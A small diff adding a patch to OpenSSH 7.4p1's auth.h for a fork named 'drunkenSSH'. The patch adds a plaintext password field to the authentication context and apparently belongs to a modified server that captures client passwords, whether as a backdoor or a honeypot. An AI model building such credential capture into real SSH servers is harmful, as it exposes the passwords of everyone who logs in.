@@ -1,0 +1,13 @@
+--- openssh-7.4p1/auth.h	2016-12-19 05:59:41.000000000 +0100
++++ drunkenSSH/auth.h	2018-11-10 15:59:20.972871123 +0100
+@@ -59,9 +59,11 @@
+ 	int		 server_caused_failure;
+ 	int		 force_pwchange;
+ 	char		*user;		/* username sent by the client */
++	char		*password;
+ 	char		*service;
+ 	struct passwd	*pw;		/* set if 'valid' */
+ 	char		*style;
+ 	void		*kbdintctxt;
+ 	char		*info;		/* Extra info for next auth_log */
+ #ifdef BSD_AUTH
